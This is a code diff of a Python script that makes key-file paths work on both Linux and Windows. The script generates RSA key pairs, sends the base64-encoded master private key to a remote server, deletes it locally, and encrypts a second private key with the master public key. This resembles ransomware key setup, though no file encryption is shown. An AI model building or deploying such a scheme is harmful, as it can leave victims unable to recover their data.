@@ -74,18 +74,25 @@ def getMacAddress():
 start = recordTime("Start process on ")
 
 #Create directory if not exists
-folder = "key"
-if not os.path.exists(folder):
-    os.makedirs(folder)
+if sys.platform == "linux" or sys.platform =="linux2":
+    folder = "key/"
+else:
+    folder = "key\\"
+
+if not os.path.exists(folder[:-1]):
+    os.makedirs(folder[:-1])
 
 
 #Generate 8mb RSA Key
-removeFile(folder+"/privkey8.der")
-removeFile(folder+"/pubkey8.der")
-generateRSA(8192,folder+"/privkey8.der",folder+"/pubkey8.der")
+removeFile(folder+"privkey8.der")
+removeFile(folder+"pubkey8.der")
+generateRSA(8192,folder+"privkey8.der",folder+"pubkey8.der")
 
 #Read Config File
-config = readJsonFile('lib/config.json')
+if sys.platform == "linux" or sys.platform =="linux2":
+    config = readJsonFile('lib/config.json')
+else:
+    config = readJsonFile('lib\config.json')
 
 #Base64 encode 8mb RSA Private Key
 privkey = base64File(folder+"/privkey8.der")
@@ -99,18 +106,18 @@ result = postRequest(url,body).json()
 print("UUID : "+ result['id'])
 
 #Remove Privatekey File
-removeFile(folder+"/privkey8.der")
+removeFile(folder+"privkey8.der")
 
 #Generate 1mb RSA key
-removeFile(folder+"/privkey1.der")
-removeFile(folder+"/pubkey1.der")
-generateRSA(1024, folder+"/privkey1.der", folder+"/pubkey1.der")
+removeFile(folder+"privkey1.der")
+removeFile(folder+"pubkey1.der")
+generateRSA(1024, folder+"privkey1.der", folder+"pubkey1.der")
 
 #Encrypt 1mb RSA Private Key using 8mb RSA Public Key
-removeFile(folder+"/privkey1_enc.der")
-rsaEnc = RsaEncrypt(folder+"/pubkey8.der")
-rsaEnc.encryptFile(folder+"/privkey1.der")
-removeFile(folder+"/privkey1.der")
+removeFile(folder+"privkey1_enc.der")
+rsaEnc = RsaEncrypt(folder+"pubkey8.der")
+rsaEnc.encryptFile(folder+"privkey1.der")
+removeFile(folder+"privkey1.der")
 
 #Record End time
 end = recordTime("End process on ")
